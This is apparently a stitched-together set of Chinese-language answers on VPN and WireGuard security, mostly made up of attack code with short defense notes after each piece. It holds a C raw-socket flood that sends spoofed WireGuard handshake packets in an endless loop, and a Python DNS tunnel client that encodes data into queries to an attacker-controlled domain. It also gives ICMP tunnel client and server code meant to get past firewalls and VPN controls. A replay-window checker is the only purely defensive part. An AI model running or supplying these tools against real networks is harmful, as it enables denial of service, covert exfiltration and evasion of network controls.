WireGuard协议设计上对DoS攻击有一定抵抗力，但仍存在攻击向量：1）握手洪泛：攻击者发送大量伪造的握手初始化消息，迫使服务器分配内存和计算资源。2）Cookie机制绕过：如果攻击者伪造源IP，服务器会发送cookie，但攻击者可以忽略cookie直接发送响应，消耗服务器CPU。3）会话表耗尽：每个握手尝试都会在服务器上创建临时状态，攻击者可以填满会话表。以下C代码演示简单的握手洪泛攻击（使用原始套接字发送UDP包）：

c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// 伪UDP包，包含WireGuard握手初始化消息（类型1）
void send_handshake(int sock, struct sockaddr_in *dst) {
    char packet[1500];
    // 构造IP头
    struct iphdr *iph = (struct iphdr *)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 148);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr("192.168.1.100"); // 伪造源IP
    iph->daddr = dst->sin_addr.s_addr;
    iph->check = 0; // 稍后计算

    // UDP头
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    udph->source = htons(12345);
    udph->dest = htons(51820); // WireGuard默认端口
    udph->len = htons(sizeof(struct udphdr) + 148);
    udph->check = 0;

    // WireGuard握手消息（简化，实际需要正确格式）
    char *wg_msg = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    wg_msg[0] = 0x01; // 类型1：握手初始化
    memset(wg_msg+1, 0, 147);

    // 发送
    sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)dst, sizeof(*dst));
}

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return 1; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(51820);
    inet_pton(AF_INET, "10.0.0.1", &dst.sin_addr);

    while (1) {
        send_handshake(sock, &dst);
        usleep(1000); // 每秒1000个包
    }
    close(sock);
    return 0;
}

防御：限制每个源IP的握手速率，使用Cookie机制验证源IP真实性，设置会话表上限。

DNS隧道通过将数据编码到DNS查询和响应中，绕过VPN限制。原理：客户端将数据分段编码为子域名，发送DNS查询到攻击者控制的权威DNS服务器；服务器解码查询，返回编码的响应数据。常见编码方式：Base32或Base64。以下Python实现一个简单的DNS隧道客户端（使用dnspython库）：

python
import dns.resolver
import base64
import sys

# 攻击者控制的DNS服务器域名
SERVER_DOMAIN = 'tunnel.example.com'

def encode_data(data):
    # 使用Base32编码，因为DNS域名不区分大小写且允许字母数字和连字符
    return base64.b32encode(data).decode().lower().rstrip('=')

def decode_data(encoded):
    # 补全填充
    padding = 8 - (len(encoded) % 8)
    if padding != 8:
        encoded += '=' * padding
    return base64.b32decode(encoded.upper())

def send_data(data):
    # 将数据分块，每块最多63字符（DNS标签限制）
    chunk_size = 30  # 留出空间给Base32膨胀
    encoded = encode_data(data)
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    for i, chunk in enumerate(chunks):
        query = f'{i}.{chunk}.{SERVER_DOMAIN}'
        try:
            answer = dns.resolver.resolve(query, 'TXT')
            for rdata in answer:
                # 响应数据在TXT记录中
                response_encoded = rdata.to_text().strip('"')
                response_data = decode_data(response_encoded)
                print(f'Received: {response_data}')
        except Exception as e:
            print(f'Error: {e}')

if __name__ == '__main__':
    # 示例：发送一条消息
    send_data(b'Hello from inside VPN!')

注意：实际DNS隧道需要双向通信，服务器端需运行自定义DNS服务器。此代码仅演示客户端发送和接收。防御：企业可监控异常DNS查询（如高频率、长域名、非标准记录类型），使用DNS过滤或隧道检测工具。

ICMP隧道将数据封装在ICMP Echo Request/Reply包中，利用ICMP协议穿透防火墙和VPN。原理：客户端发送ICMP Echo Request，数据字段携带编码后的数据；服务器（伪装成目标主机）回复ICMP Echo Reply，数据字段携带响应。由于ICMP通常被允许通过，可以绕过VPN限制。以下C语言实现一个简单的ICMP隧道客户端（使用原始套接字）：

c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define PACKET_SIZE 1500

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (; len > 1; len -= 2) sum += *buf++;
    if (len) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void send_icmp(int sock, struct sockaddr_in *dst, const char *data, int data_len) {
    char packet[PACKET_SIZE];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(12345);
    icmp->un.echo.sequence = htons(1);
    memcpy(packet + sizeof(struct icmphdr), data, data_len);
    icmp->checksum = 0;
    icmp->checksum = checksum(packet, sizeof(struct icmphdr) + data_len);
    sendto(sock, packet, sizeof(struct icmphdr) + data_len, 0, (struct sockaddr *)dst, sizeof(*dst));
}

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket"); return 1; }
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, "10.0.0.2", &dst.sin_addr);

    char *msg = "Hello from ICMP tunnel!";
    send_icmp(sock, &dst, msg, strlen(msg));
    printf("Sent ICMP packet with data\n");
    close(sock);
    return 0;
}

服务器端需要监听ICMP并回复。防御：限制ICMP包大小、频率，或完全禁用ICMP；使用深度包检测（DPI）识别异常ICMP负载。

WireGuard使用基于时间戳的滑动窗口机制防止重放攻击。每个数据包包含一个64位的计数器（nonce），发送方递增该计数器，接收方维护一个滑动窗口（默认大小为2048个槽位）。接收方检查数据包的计数器是否在窗口内且未被使用过。如果计数器小于窗口左边界，则丢弃；如果计数器在窗口内但已标记为已接收，则丢弃；如果计数器大于窗口右边界，则移动窗口并标记。此外，WireGuard还使用时间戳（可选）来防止过旧的数据包，但核心是计数器滑动窗口。以下是一个C语言实现简单重放检测的代码片段（假设窗口大小为2048，使用位图）：
c
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#define WINDOW_SIZE 2048
#define BITMAP_SIZE (WINDOW_SIZE / 8)

struct replay_window {
    uint64_t window_start;  // 窗口左边界对应的计数器值
    uint8_t bitmap[BITMAP_SIZE];
};

bool replay_check(struct replay_window *rw, uint64_t counter) {
    if (counter < rw->window_start) {
        return false; // 太旧，丢弃
    }
    uint64_t offset = counter - rw->window_start;
    if (offset >= WINDOW_SIZE) {
        // 计数器超出窗口右边界，移动窗口
        uint64_t shift = offset - WINDOW_SIZE + 1;
        if (shift >= WINDOW_SIZE) {
            // 完全超出，重置窗口
            memset(rw->bitmap, 0, BITMAP_SIZE);
            rw->window_start = counter;
            offset = 0;
        } else {
            // 部分移动
            memmove(rw->bitmap, rw->bitmap + shift/8, BITMAP_SIZE - shift/8);
            memset(rw->bitmap + BITMAP_SIZE - shift/8, 0, shift/8);
            rw->window_start += shift;
            offset = counter - rw->window_start;
        }
    }
    // 检查位图
    uint64_t byte_idx = offset / 8;
    uint8_t bit_mask = 1 << (offset % 8);
    if (rw->bitmap[byte_idx] & bit_mask) {
        return false; // 已接收过，重放
    }
    // 标记为已接收
    rw->bitmap[byte_idx] |= bit_mask;
    return true;
}

该实现模拟了WireGuard的滑动窗口，但实际WireGuard内核实现更高效（使用位图数组和原子操作）。重放攻击防御是VPN安全的基础，WireGuard的设计使其能够抵御中间人重放攻击。

ICMP隧道（ICMP tunneling）利用ICMP Echo请求和响应（ping）来传输数据。由于许多防火墙允许ICMP通过，攻击者可以将数据隐藏在ICMP数据字段中。原理：客户端发送ICMP Echo请求，将数据编码在ICMP数据部分（通常为64字节或更多）。服务器（或中间节点）接收请求，提取数据，并将响应数据编码在ICMP Echo回复中。实现要点：1. 使用原始套接字（raw socket）构造ICMP包。2. 需要计算ICMP校验和。3. 数据分段和重组。以下C语言代码演示了一个简单的ICMP隧道客户端（发送数据）和服务器（接收数据）：

c
// 服务器端（监听ICMP Echo请求）
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (; len > 1; len -= 2) sum += *buf++;
    if (len) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket"); return 1; }
    char buffer[1024];
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    while (1) {
        int n = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addr_len);
        if (n < 0) continue;
        struct iphdr *ip = (struct iphdr*)buffer;
        int iph_len = ip->ihl * 4;
        struct icmphdr *icmp = (struct icmphdr*)(buffer + iph_len);
        if (icmp->type == ICMP_ECHO) {
            // 提取数据（ICMP数据部分）
            char *data = buffer + iph_len + sizeof(struct icmphdr);
            int data_len = n - iph_len - sizeof(struct icmphdr);
            printf("收到数据: ");
            fwrite(data, 1, data_len, stdout);
            printf("\n");
            // 构造回复（ICMP Echo Reply）
            struct icmphdr reply;
            reply.type = ICMP_ECHOREPLY;
            reply.code = 0;
            reply.checksum = 0;
            reply.un.echo.id = icmp->un.echo.id;
            reply.un.echo.sequence = icmp->un.echo.sequence;
            // 复制数据
            char reply_pkt[sizeof(reply) + data_len];
            memcpy(reply_pkt, &reply, sizeof(reply));
            memcpy(reply_pkt + sizeof(reply), data, data_len);
            // 计算校验和
            ((struct icmphdr*)reply_pkt)->checksum = checksum(reply_pkt, sizeof(reply) + data_len);
            // 发送回复
            sendto(sock, reply_pkt, sizeof(reply) + data_len, 0, (struct sockaddr*)&addr, addr_len);
        }
    }
    close(sock);
    return 0;
}


客户端类似，构造ICMP Echo请求并发送。防御方法：限制ICMP数据包大小，监控异常ICMP流量，或完全禁用ICMP（但可能影响网络诊断）。
